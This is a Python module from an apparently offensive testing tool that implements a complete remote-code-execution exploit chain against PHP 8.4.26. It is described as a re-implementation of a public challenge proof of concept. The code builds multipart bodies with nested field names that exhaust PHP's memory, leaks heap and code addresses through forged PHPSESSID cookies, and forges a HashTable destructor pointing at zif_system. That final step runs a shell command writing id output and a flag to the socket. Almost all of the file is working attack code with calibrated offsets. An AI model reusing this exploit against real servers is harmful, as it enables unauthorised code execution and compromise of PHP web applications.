"""KillaBoi-class chain: nested-name fill, session-cookie disclosure, zif_system.

This is the third end-to-end chain class in the tool, alongside the stock
mod_php chain, the Chain-E FPM class and the PHP-7.2 port. It exists because
the 1.41 MB header-dense and 66 MB field producers cannot pass a ~1 MiB front
cap, while a 249 KB nested-name body still aborts a 128 MiB parser.

Provenance
----------
The class is the one published by KillaBoi (``KillaBoi/StealMyBitcoin-PoC``)
for the Steal My Bitcoin challenge; this module is our re-implementation in the
tool's own transport, ledger and verdict conventions. Its two measured facts
are reproduced in the lab by ``tools/e2e/tests`` and in the sealed probe
directory:

* **amplification** — 950 file controls named ``f[i][x]...[x]`` (depth 57) with
  ``filename=""`` cost 246,041 B of wire and 132,263,744 B of emalloc peak
  (537x). The same names without the file attribute cost 43,984,448 B, so the
  file-control attribute is the 3x multiplier; the amplifier is a parser bug,
  not a transport trick.
* **disclosure** — the parse-stage OOM leaves session state half-built in a
  worker that survives the request. A later *consumer* request reuses that
  worker's heap with a crafted array/string overlap, so ``php_session_send_cookie``
  encodes a forged session-id length and returns neighbouring heap bytes in
  ``Set-Cookie: PHPSESSID=...``. A 256-byte cookie yields the Zend chunk base;
  a 16-byte cookie yields ``zval_ptr_dtor``.

Discipline
----------
The whole flow fits under the cap: producer 249,042 B, heap consumer 6,672 B,
code consumer 92,388 B, final 368,812 B. One producer and N consumers are
written down one connection; a multiplexing front (nginx/CDN) turns each client
request into its own upstream connection, so the consumers are an independent
fan-out against the surviving worker. That is the ``poison_then_spray`` worker
doctrine, selected for this class rather than the prefork holder strategies.

The two leaks must come from the *same* invocation: the heap base is per worker
process. The final request forges a HashTable whose ``pDestructor`` is
``zif_system`` and triggers the OOM cleanup path; the command locates the
accepted socket under ``/proc/self/fd`` so its output reaches the HTTP response.

Offsets are the measured Alpine PHP 8.4.26 image (the challenge build):
``zval_ptr_dtor`` page offset ``0x112930``, ``zif_system = dtor - 0x204BC0``,
and the controlled carrier at ``chunk_base - 0x8400000 + 0x16D1D8``. They are
data, overridable from the CLI, and a mismatch is reported, never silently
assumed.
"""
from __future__ import annotations

import hashlib
import http.client
import re
import secrets
import socket
import struct
import time
import urllib.parse
from dataclasses import dataclass
from typing import Optional

from .context import Context
from .doctrine import utc_iso
from .http import Response

# ---------------------------------------------------------------------------
# calibration (measured; see module docstring)
# ---------------------------------------------------------------------------
COOKIE_BOUNDARY = b"COOKIE-LAB-BOUNDARY"
FINAL_BOUNDARY = b"h" * 10
BODY_LIMIT = 1 << 20
MAX_RESPONSE_BYTES = 1 << 17
CONSUMERS = 8
COOKIE_PAIRS = 1001

CHUNK_MASK = (1 << 21) - 1
MIN_POINTER_AGREEMENT = 4
HEAP_MIN, HEAP_MAX = 0x700000000000, 0x800000000000
CODE_MIN, CODE_MAX = 0x500000000000, 0x700000000000
ORDINARY_COOKIE_BYTES = 32

CARRIER_SIZE = 384
COMMAND_OFFSET = 0x98
COMMAND_LIMIT = CARRIER_SIZE - COMMAND_OFFSET - 1

#: Measured on the challenge image (Alpine PHP 8.4.26, cli-server behind
#: nginx). Fingerprint low 21 bits of zval_ptr_dtor, the zif_system distance,
#: and the distance from the leaked Zend chunk base to the carrier field.
DEFAULT_GEOMETRY = {
    "image": "php:8.4.26-fpm-alpine3.23 (cli-server SAPI)",
    "dtor_low21": 0x112930,
    "zif_from_dtor": -0x204BC0,
    "carrier_delta": 0x8400000,
    "carrier_offset": 0x16D1D8,
}


@dataclass(frozen=True)
class ProducerShape:
    """Nested-name geometry that decides how much memory parsing will burn.

    ``count`` file controls are named ``f[i][x][x]...`` with ``depth`` nested
    segments. A few dozen wire bytes per part materialise a deep ``$_FILES``
    tree in memory. The two stages use different shapes because each must leave
    the worker in a different allocation state.
    """

    depth: int
    count: int
    field_count: int
    field_value_size: int


HEAP_SHAPE = ProducerShape(depth=57, count=950, field_count=50, field_value_size=1)
CODE_SHAPE = ProducerShape(depth=58, count=935, field_count=65, field_value_size=39)
STAGES = {"heap": HEAP_SHAPE, "code": CODE_SHAPE}


# ---------------------------------------------------------------------------
# multipart building blocks (byte-for-byte the published shapes)
# ---------------------------------------------------------------------------
def multipart_part(boundary: bytes, name: bytes, value: bytes = b"",
                   filename: Optional[bytes] = None) -> bytes:
    header = (b"--" + boundary +
              b'\r\nContent-Disposition: form-data; name="' + name + b'"')
    if filename is not None:
        header += b'; filename="' + filename + b'"'
    return header + b"\r\n\r\n" + value + b"\r\n"


def finish_multipart(parts, boundary: bytes, *, limit: int = BODY_LIMIT) -> bytes:
    """Close a multipart body and enforce the front's per-body wire cap."""
    body = b"".join(parts) + b"--" + boundary + b"--\r\n"
    if not 0 < len(body) < limit:
        raise ValueError(
            f"multipart body {len(body)} B is outside the {limit} B cap"
        )
    return body


def _nested_name(index: int, depth: int) -> bytes:
    return b"f[" + str(index).encode() + b"]" + b"[x]" * depth


def _nested_part_len(boundary: bytes, name: bytes) -> int:
    return (
        len(b"--") + len(boundary) + 2
        + len(b'Content-Disposition: form-data; name="') + len(name)
        + len(b'"; filename=""')
        + len(b"\r\n\r\n\r\n")
    )


def _part_len(boundary: bytes, name: bytes, value_len: int,
              filename: Optional[bytes] = None) -> int:
    head = (
        len(b"--") + len(boundary) + 2
        + len(b'Content-Disposition: form-data; name="') + len(name) + len(b'"')
        + (len(b'; filename="') + len(filename or b"") + 1 if filename is not None else 0)
        + len(b"\r\n\r\n")
    )
    return head + value_len + 2


def producer_wire(shape: ProducerShape = HEAP_SHAPE,
                  boundary: bytes = COOKIE_BOUNDARY) -> int:
    """Exact wire size of :func:`producer_body` (computed, not materialised)."""
    total = 0
    for index in range(shape.field_count):
        total += _part_len(boundary, f"p{index:04d}".encode(),
                           shape.field_value_size)
    total += _part_len(boundary, b"PHPSESSID", 1)
    total += _part_len(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", 3)
    total += _part_len(boundary, b"f", 64, filename=b"a.txt")
    for index in range(shape.count):
        total += _nested_part_len(boundary, _nested_name(index, shape.depth))
    total += len(b"--") + len(boundary) + len(b"--\r\n")
    return total


def producer_body(shape: ProducerShape = HEAP_SHAPE,
                  boundary: bytes = COOKIE_BOUNDARY) -> bytes:
    """Make PHP run out of memory while parsing session upload progress.

    The NUL PHPSESSID and the upload-progress field drag the session code into
    the parse path, so the OOM happens with session state half-built; that
    half-built state is what the consumers go after.
    """
    parts = [
        multipart_part(boundary, f"p{index:04d}".encode(),
                       b"x" * shape.field_value_size)
        for index in range(shape.field_count)
    ]
    parts += [
        multipart_part(boundary, b"PHPSESSID", b"\x00"),
        multipart_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"ppp"),
        multipart_part(boundary, b"f", b"A" * 64, b"a.txt"),
    ]
    for index in range(shape.count):
        parts.append(
            multipart_part(boundary, _nested_name(index, shape.depth),
                           filename=b"")
        )
    return finish_multipart(parts, boundary)


def heap_consumer_body(boundary: bytes = COOKIE_BOUNDARY) -> bytes:
    """Reclaim stale session data and turn it into a 256-byte cookie leak."""
    parts = [
        multipart_part(boundary, b"PHPSESSID", b"a"),
        multipart_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
    ]
    for index in range(51):
        value = (f"v{index:04d}".encode() + b"x" * 48)[:48]
        parts.append(multipart_part(boundary, str(1000 + index).encode(), value))
    # Repeating numeric key 1050 changes the array's allocation pattern so the
    # crafted value below lands on the stale string header.
    parts.append(multipart_part(boundary, b"1050", b"Z" * 128))
    # Overwrite that header's length field with 256; PHP then serialises 256
    # bytes of whatever follows it in memory into the PHPSESSID cookie.
    forged = bytearray(b"A" * 79)
    struct.pack_into("<Q", forged, 0x10, 256)
    forged[0x18] = ord("L")
    parts.append(multipart_part(boundary, b"1999", bytes(forged)))
    return finish_multipart(parts, boundary)


def code_consumer_body(boundary: bytes = COOKIE_BOUNDARY) -> bytes:
    """Shape the reused worker's allocations to disclose zval_ptr_dtor."""
    parts = [
        multipart_part(boundary, b"PHPSESSID", b"a"),
        multipart_part(boundary, b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn"),
    ]
    for index in range(73):
        parts.append(multipart_part(boundary, f"s{index:04d}".encode(), b"P" * 24))
    # One 16-element array at position 69 exposes the code pointer in a
    # 16-byte PHPSESSID value on the calibrated Alpine build.
    for index in range(983 - 73):
        for slot in range(16 if index == 69 else 1):
            parts.append(
                multipart_part(boundary, f"a{index:04d}[{slot}]".encode(), b"x" * 16)
            )
    return finish_multipart(parts, boundary)


def consumer_body(stage: str, boundary: bytes = COOKIE_BOUNDARY) -> bytes:
    if stage == "heap":
        return heap_consumer_body(boundary)
    if stage == "code":
        return code_consumer_body(boundary)
    raise ValueError(f"unknown stage {stage!r}")


# ---------------------------------------------------------------------------
# HTTP framing (the published header order is part of the calibration)
# ---------------------------------------------------------------------------
def _cookie_name(index: int) -> str:
    alphabet = "0123456789abcdefghijklmnopqrstuvwxyz"
    return alphabet[(index // 36) % 36] + alphabet[index % 36]


def http_frame(target, body: bytes, boundary: bytes, *,
               cookie_pairs: int = 0, close: bool = True,
               path: Optional[str] = None) -> bytes:
    lines = [
        f"POST {path or target.path} HTTP/1.1",
        f"Host: {target.host_header}",
        "Connection: close" if close else "Connection: keep-alive",
        f"Content-Length: {len(body)}",
        "Content-Type: multipart/form-data; boundary=" + boundary.decode("ascii"),
    ]
    if cookie_pairs:
        lines.append("Cookie: " + "".join(
            _cookie_name(i) + "=;" for i in range(cookie_pairs)))
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii") + body


class _RecordingReader:
    """Collect plaintext response bytes while http.client parses them.

    ``close`` is a no-op on purpose: http.client closes its file after each
    response, but a pipelined batch needs the stream to survive all of them.
    """

    def __init__(self, reader):
        self.reader = reader
        self.chunks: list[bytes] = []
        self.offsets: list[int] = [0]

    def read(self, *args, **kwargs):
        value = self.reader.read(*args, **kwargs)
        self.chunks.append(value)
        self.offsets.append(self.size())
        return value

    def readline(self, *args, **kwargs):
        value = self.reader.readline(*args, **kwargs)
        self.chunks.append(value)
        self.offsets.append(self.size())
        return value

    def close(self):
        pass

    def size(self) -> int:
        return sum(len(chunk) for chunk in self.chunks)

    def raw_between(self, start: int, end: int) -> bytes:
        joined = b"".join(self.chunks)
        return joined[start:end] if end > start else b""


class _SharedSocket:
    """Hand the same stream to every HTTPResponse built from one connection."""

    def __init__(self, reader: _RecordingReader):
        self.reader = reader

    def makefile(self, *_args, **_kwargs):
        return self.reader


def _cookie_from(headers: dict) -> bytes:
    raw = headers.get("set-cookie") or ""
    if "PHPSESSID=" not in raw:
        return b""
    encoded = raw.split("PHPSESSID=", 1)[1].split(";", 1)[0]
    return urllib.parse.unquote_to_bytes(encoded.replace("+", " "))


def send_batch(ctx: Context, frames: list[bytes], *, note: str,
               timeout: float = 30.0) -> list[Response]:
    """Send pipelined requests on one connection and read one response each.

    A multiplexing front turns each client request into its own upstream
    connection, so this is the fan-out primitive: one producer plus N
    consumers written together, answered in order.
    """
    if not frames:
        return []
    sock = ctx.http.open_socket(timeout=timeout)
    reader = _RecordingReader(sock.makefile("rb"))
    shared = _SharedSocket(reader)
    responses: list[Response] = []
    started = time.monotonic()
    try:
        if ctx.ledger is not None:
            for _frame in frames:
                ctx.ledger.spend(note)
        ctx.doctrine.wait()
        ctx.doctrine.note_request()
        sock.sendall(b"".join(frames))
        for frame in frames:
            before = reader.size()
            try:
                response = http.client.HTTPResponse(shared)
                response.begin()
                body = response.read(MAX_RESPONSE_BYTES)
                status = response.status
                headers = {name.lower(): value for name, value in response.getheaders()}
                outcome = "ok" if status else "net"
                error = ""
            except (OSError, http.client.HTTPException) as exc:
                # The front closed or stalled mid-batch: keep what arrived and
                # record the loss instead of losing the whole stage.
                status = 0
                headers = {}
                body = b""
                outcome = "net"
                error = repr(exc)
            raw = reader.raw_between(before, reader.size())
            record = Response(
                status=status,
                headers=headers,
                body=body,
                raw=raw,
                elapsed=time.monotonic() - started,
                outcome=outcome,
                error=error,
                at=utc_iso(),
                sent=len(frame),
                note=note,
            )
            ctx.http._consume(record, started, note, "POST")
            responses.append(record)
            if outcome != "ok":
                break
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return responses


# ---------------------------------------------------------------------------
# decoders
# ---------------------------------------------------------------------------
def heap_candidate(cookie: bytes) -> Optional[dict]:
    """Recover one aligned Zend chunk base from a 256-byte cookie.

    The leaked bytes are not aligned for us, so every byte offset is tried.
    Requiring several pointers to agree on the same aligned chunk separates a
    real leak from coincidental ASCII.
    """
    if len(cookie) != 256:
        return None
    candidates = []
    for alignment in range(8):
        words = (
            struct.unpack_from("<Q", cookie, pos)[0]
            for pos in range(alignment, len(cookie) - 7, 8)
        )
        counts = {}
        for value in words:
            if HEAP_MIN <= value < HEAP_MAX:
                base = value & ~CHUNK_MASK
                counts[base] = counts.get(base, 0) + 1
        if counts:
            base, hits = max(counts.items(), key=lambda item: item[1])
            candidates.append((hits, alignment, base))
    if not candidates:
        return None
    hits, alignment, base = max(candidates)
    if hits < MIN_POINTER_AGREEMENT:
        return None
    return {"heap": base, "hits": hits, "alignment": alignment,
            "cookie_bytes": len(cookie)}


def code_candidate(cookie: bytes, geometry: Optional[dict] = None,
                   expected: Optional[int] = None) -> Optional[dict]:
    """Require the 16-byte cookie and the calibrated code fingerprint."""
    geometry = geometry or DEFAULT_GEOMETRY
    if len(cookie) != 16 or struct.unpack_from("<Q", cookie)[0] != 16:
        return None
    value = struct.unpack_from("<Q", cookie, 8)[0]
    if not (CODE_MIN <= value < CODE_MAX):
        return None
    if value & CHUNK_MASK != int(geometry["dtor_low21"]):
        return None
    if expected is not None and value != expected:
        return None
    return {"dtor": value, "low21": value & CHUNK_MASK, "cookie_bytes": len(cookie)}


# ---------------------------------------------------------------------------
# fire stage
# ---------------------------------------------------------------------------
def fake_hashtable(address: int, zif_system: int, command: bytes) -> bytes:
    """Build the 384-byte HashTable / execute_data / zend_string overlap.

    Three structures share one buffer. The cleanup path reads the HashTable's
    ``pDestructor`` and calls it; we point that at ``zif_system``. The first
    bucket sits where a call frame's arguments would be, so ``zif_system``
    finds the zend_string below as its single argument.
    """
    if b"\x00" in command:
        raise ValueError("command cannot contain a NUL byte")
    if len(command) > COMMAND_LIMIT:
        raise ValueError(
            f"command is {len(command)} bytes; the carrier holds {COMMAND_LIMIT}"
        )
    data = bytearray(CARRIER_SIZE)
    # zend_array header.
    struct.pack_into("<II", data, 0x00, 1, 7)              # gc, IS_ARRAY
    struct.pack_into("<II", data, 0x08, 0x10, 0xFFFFFFF8)  # flags, mask
    struct.pack_into("<Q", data, 0x10, address + 0x20)     # arData -> bucket
    struct.pack_into("<II", data, 0x18, 1, 1)              # used, elements
    struct.pack_into("<II", data, 0x20, 8, 0)              # size, pointer
    struct.pack_into("<Q", data, 0x28, 0)                  # next free
    struct.pack_into("<Q", data, 0x30, zif_system)         # pDestructor
    # Same bytes reinterpreted as the fake execute_data at address + 0x20.
    struct.pack_into("<Q", data, 0x20, 0)                  # opline
    struct.pack_into("<Q", data, 0x30, zif_system)         # return_value
    struct.pack_into("<I", data, 0x4C, 1)                  # num_args
    struct.pack_into("<Q", data, 0x70, address + 0x80)     # arg1 -> zend_string
    struct.pack_into("<I", data, 0x78, 6)                  # arg1 type IS_STRING
    # zend_string holding the command, NUL terminated.
    struct.pack_into("<II", data, 0x80, 1, 0x106)          # gc, flags
    struct.pack_into("<Q", data, 0x90, len(command))       # length
    data[COMMAND_OFFSET:COMMAND_OFFSET + len(command)] = command
    data[COMMAND_OFFSET + len(command)] = 0
    return bytes(data)


def final_geometry(heap: int, geometry: Optional[dict] = None,
                   shift: int = 0) -> dict:
    """Resolve the three absolute addresses the final request writes."""
    geometry = geometry or DEFAULT_GEOMETRY
    if heap & CHUNK_MASK or not HEAP_MIN <= heap < HEAP_MAX:
        raise ValueError("heap address is not a plausible aligned Zend chunk")
    table = heap - int(geometry["carrier_delta"]) + int(geometry["carrier_offset"]) + shift
    return {
        "table_address": table,
        "carrier_delta": int(geometry["carrier_delta"]),
        "carrier_offset": int(geometry["carrier_offset"]),
        "shift": shift,
    }


def final_multipart(table_address: int, zif_system: int, command: bytes,
                    boundary: bytes = FINAL_BOUNDARY) -> bytes:
    """Place the fake table and trigger the final cleanup callback."""
    forged = fake_hashtable(table_address, zif_system, command)
    parts = []
    for index in range(1000):
        name = b"f[" + str(index).encode() + b"]" + b"[x]" * 54
        parts.append(multipart_part(boundary, name, filename=b""))
    # Slot 13 of this primer supplies the pointer consumed during the final OOM
    # cleanup. Order matters: "hold" must be allocated and filled with the
    # forged table before the long field name triggers that OOM.
    primer = bytearray(b"Q" * 276)
    struct.pack_into("<Q", primer, 13 * 8, table_address)
    parts += [
        multipart_part(boundary, b"", bytes(primer)),
        multipart_part(boundary, b"a", b"1"),
        multipart_part(boundary, b"hold", forged),
        multipart_part(boundary, b"K" * 128000 + b"[x]", b"1"),
    ]
    return finish_multipart(parts, boundary)


def proof_command(nonce: str, flag_token: str = "print-flag") -> bytes:
    """Write a nonce, ``id``, the binary digest and the flag to the socket.

    ``zif_system``'s stdout does not reach the HTTP response, so the command
    locates its own accepted TCP socket by matching the listening inode from
    ``/proc/net`` against ``/proc/self/fd``, then redirects everything there.
    """
    if not re.fullmatch(r"[A-Za-z0-9._\-/]+", flag_token):
        raise ValueError("flag binary token contains unsafe characters")
    command = (
        "i=$(awk '$4==\"01\"{print $10;exit}' /proc/net/tcp*);"
        "f=5;for x in /proc/self/fd/*;do "
        "[ \"$(readlink \"$x\")\" = \"socket:[$i]\" ]&&f=${x##*/};done;"
        f'eval "{{ echo {nonce};id;sha256sum \\"$(which {flag_token})\\";'
        f'{flag_token};}}>&$f 2>&$f"'
    ).encode("ascii")
    if len(command) > COMMAND_LIMIT:
        raise ValueError(
            f"proof command is {len(command)} bytes; the carrier holds {COMMAND_LIMIT}"
        )
    return command


# ---------------------------------------------------------------------------
# chain execution
# ---------------------------------------------------------------------------
def _log(message: str) -> None:
    print(message, flush=True)


def _is_oom(response: Response, body: bytes) -> bool:
    return (
        response.status == 200
        and b"Allowed memory size" in body
        and b"exhausted" in body
    )


def leak_stage(ctx: Context, stage: str, *, geometry: dict,
               consumers: int = CONSUMERS, cookie_pairs: int = COOKIE_PAIRS,
               rounds: int = 3) -> dict:
    """One producer + ``consumers`` pipelined consumers, repeated on a miss."""
    shape = STAGES[stage]
    log: list[str] = []
    last: dict = {}
    for round_index in range(1, max(1, rounds) + 1):
        producer = producer_body(shape)
        consumer = consumer_body(stage)
        frames = [
            http_frame(ctx.target, producer, COOKIE_BOUNDARY,
                       cookie_pairs=cookie_pairs, close=False)
        ]
        frames += [
            http_frame(ctx.target, consumer, COOKIE_BOUNDARY,
                       close=(index == consumers - 1))
            for index in range(consumers)
        ]
        responses = send_batch(
            ctx, frames, note=f"killaboi:{stage}:{round_index}",
            timeout=max(30.0, float(ctx.options.get("chain_timeout") or 30.0)),
        )
        if not responses:
            last = {
                "stage": stage,
                "round": round_index,
                "producer_status": 0,
                "producer_oom": False,
                "producer_wire": len(frames[0]),
                "consumer_wire": len(frames[1]) if len(frames) > 1 else 0,
                "cookie_lengths": [],
                "candidate": None,
                "reason": "the front dropped the batch before the first response",
            }
            _log(f"  killaboi[{stage}] {round_index}/{max(1, rounds)}: no response")
            continue
        producer_response = responses[0]
        producer_ok = _is_oom(producer_response, producer_response.body or b"")
        cookie_lengths = []
        candidate = None
        for response in responses[1:]:
            cookie = _cookie_from(response.headers)
            cookie_lengths.append(len(cookie))
            if stage == "heap":
                found = heap_candidate(cookie)
            else:
                found = code_candidate(cookie, geometry)
            if found is not None:
                candidate = found
                break
        last = {
            "stage": stage,
            "round": round_index,
            "producer_status": producer_response.status,
            "producer_oom": producer_ok,
            "producer_wire": len(frames[0]),
            "consumer_wire": len(frames[1]) if len(frames) > 1 else 0,
            "consumer_responses": len(responses) - 1,
            "cookie_lengths": cookie_lengths,
            "candidate": candidate,
        }
        if len(responses) != consumers + 1:
            last["partial_batch"] = True
        _log(
            f"  killaboi[{stage}] {round_index}/{max(1, rounds)}: "
            f"producer={producer_response.status} oom={producer_ok} "
            f"cookies={cookie_lengths[:8]}"
            + (f" -> {candidate}" if candidate else "")
        )
        if not producer_ok:
            last["reason"] = "the producer did not render a PHP memory-limit fatal"
            continue
        if candidate is not None:
            return {"found": True, "record": last, "log": log}
    last.setdefault("reason", f"no {stage} disclosure in {rounds} round(s)")
    return {"found": False, "record": last, "log": log}


def fire_stage(ctx: Context, heap: int, dtor: int, *, geometry: dict,
               attempts: int = 3, batch: int = 1,
               flag_token: str = "print-flag",
               shifts: Optional[list] = None) -> dict:
    """Send the forged callback, in ``attempts`` batches of ``batch`` requests."""
    nonce = secrets.token_hex(8)
    command = proof_command(nonce, flag_token)
    zif = dtor + int(geometry["zif_from_dtor"])
    shift_list = list(shifts or [0])
    records = []
    for attempt in range(1, max(1, attempts) + 1):
        for shift in shift_list:
            addresses = final_geometry(heap, geometry, shift)
            body = final_multipart(addresses["table_address"], zif, command)
            frames = [
                http_frame(ctx.target, body, FINAL_BOUNDARY,
                           close=(index == batch - 1))
                for index in range(max(1, batch))
            ]
            note = f"killaboi:fire:{attempt}:{shift:+#x}"
            responses = send_batch(
                ctx, frames, note=note,
                timeout=max(30.0, float(ctx.options.get("chain_timeout") or 30.0)),
            )
            for index, response in enumerate(responses, 1):
                text = (response.body or b"").decode("utf-8", "replace")
                nonce_seen = nonce in text
                id_seen = re.search(r"\buid=\d+", text) is not None
                hash_seen = re.search(
                    rb"\b[0-9a-f]{64}\s+\S*" + re.escape(flag_token.encode()) + rb"\b",
                    response.body or b"",
                ) is not None
                proof = nonce_seen and id_seen and hash_seen
                records.append({
                    "attempt": attempt,
                    "batch_index": index,
                    "shift": shift,
                    "table_address": addresses["table_address"],
                    "zif_system": zif,
                    "status": response.status,
                    "body_bytes": len(response.body or b""),
                    "nonce_seen": nonce_seen,
                    "id_seen": id_seen,
                    "binary_hash_seen": hash_seen,
                    "execution_proof": proof,
                })
                if proof:
                    return {
                        "found": True,
                        "nonce": nonce,
                        "command": command.decode("latin1"),
                        "receipt": text,
                        "table_address": addresses["table_address"],
                        "zif_system": zif,
                        "attempts": records,
                    }
            _log(
                f"  killaboi[fire] {attempt}/{max(1, attempts)} "
                f"batch={len(responses)} "
                f"status={[r.status for r in responses]} "
                f"markers={sum(1 for r in records if r['execution_proof'])}"
            )
    return {"found": False, "nonce": nonce, "command": command.decode("latin1"),
            "attempts": records}


def geometry_from_options(options: dict) -> dict:
    geometry = dict(DEFAULT_GEOMETRY)
    if options.get("kb_dtor_low21") is not None:
        geometry["dtor_low21"] = int(options["kb_dtor_low21"])
    if options.get("kb_zif_from_dtor") is not None:
        geometry["zif_from_dtor"] = int(options["kb_zif_from_dtor"])
    if options.get("kb_carrier_delta") is not None:
        geometry["carrier_delta"] = int(options["kb_carrier_delta"])
    if options.get("kb_carrier_offset") is not None:
        geometry["carrier_offset"] = int(options["kb_carrier_offset"])
    return geometry


def run_chain(ctx: Context) -> dict:
    """The KillaBoi-class flow: arm -> leak both bases -> forge the callback."""
    options = ctx.options
    geometry = geometry_from_options(options)
    consumers = int(options.get("kb_consumers") or CONSUMERS)
    cookie_pairs = int(options.get("kb_cookie_pairs") or COOKIE_PAIRS)
    rounds = int(options.get("kb_leak_rounds") or options.get("leak_attempts") or 3)
    attempts = int(options.get("fire_attempts") or 3)
    batch = int(options.get("kb_fire_batch") or 1)
    flag_token = options.get("kb_flag") or "print-flag"
    shifts = options.get("kb_table_shifts") or [0]
    started = time.monotonic()
    result = {
        "phase": "chain",
        "method": "killaboi_chain",
        "class": "killaboi_nested_session_cookie",
        "target": str(ctx.target),
        "geometry": geometry,
        "worker_strategy": "poison_then_spray",
        "wire": {
            "producer_heap": producer_wire(HEAP_SHAPE),
            "producer_code": producer_wire(CODE_SHAPE),
            "consumer_heap": len(heap_consumer_body()),
            "consumer_code": len(code_consumer_body()),
            "final": len(final_multipart(0x700000000000, 0x500000000000,
                                         proof_command("0" * 16))),
        },
        "stages": {},
        "leak": {},
        "proof": {"found": False},
        "attempts": [],
        "verdict": "",
    }
    try:
        for stage in ("heap", "code"):
            outcome = leak_stage(
                ctx, stage, geometry=geometry, consumers=consumers,
                cookie_pairs=cookie_pairs, rounds=rounds,
            )
            result["stages"][stage] = outcome["record"]
            if not outcome["found"]:
                producer = outcome["record"]
                result["verdict"] = (
                    "PRODUCER_REFUSED" if not producer.get("producer_oom")
                    else "LEAK_FAILED"
                )
                result["error"] = producer.get("reason", f"{stage} leak failed")
                result["requests"] = len(ctx.http.requests)
                result["elapsed_s"] = round(time.monotonic() - started, 2)
                return result
            leak = outcome["record"]["candidate"]
            result["leak"].update(leak)

        heap = result["leak"].get("heap") or 0
        dtor = result["leak"].get("dtor") or 0
        if not heap or not dtor:
            result["verdict"] = "LEAK_FAILED"
            result["error"] = "both-bases disclosure incomplete"
            result["requests"] = len(ctx.http.requests)
            result["elapsed_s"] = round(time.monotonic() - started, 2)
            return result

        fired = fire_stage(
            ctx, heap, dtor, geometry=geometry, attempts=attempts,
            batch=batch, flag_token=flag_token, shifts=shifts,
        )
        result["attempts"] = fired["attempts"]
        result["fire_nonce"] = fired["nonce"]
        result["fire_command"] = fired["command"]
        if fired["found"]:
            result["verdict"] = "PROVEN"
            result["proof"] = {
                "found": True,
                "class": "killaboi",
                "method": "zif_system via forged HashTable pDestructor",
                "nonce": fired["nonce"],
                "table_address": fired["table_address"],
                "zif_system": fired["zif_system"],
                "receipt": fired["receipt"],
                "receipt_sha256": hashlib.sha256(
                    fired["receipt"].encode("utf-8", "replace")
                ).hexdigest(),
                "at": utc_iso(),
            }
            ctx.proof = fired["receipt"].encode("utf-8", "replace")
            ctx.proof_source = "killaboi:session-cookie-leak+zif_system"
            if ctx.ledger is not None:
                ctx.ledger.set_proof(ctx.proof)
        else:
            result["verdict"] = "NO_PROOF"
            result["error"] = "forged callback sent but no proof marker appeared"
    except ValueError as exc:
        result["verdict"] = "GEOMETRY_REFUSED"
        result["error"] = str(exc)
    except Exception as exc:  # transport, decode, protocol: keep the document
        result["verdict"] = "ABORTED"
        result["error"] = f"{type(exc).__name__}: {exc}"
    finally:
        result["requests"] = len(ctx.http.requests)
        result["elapsed_s"] = round(time.monotonic() - started, 2)
    return result
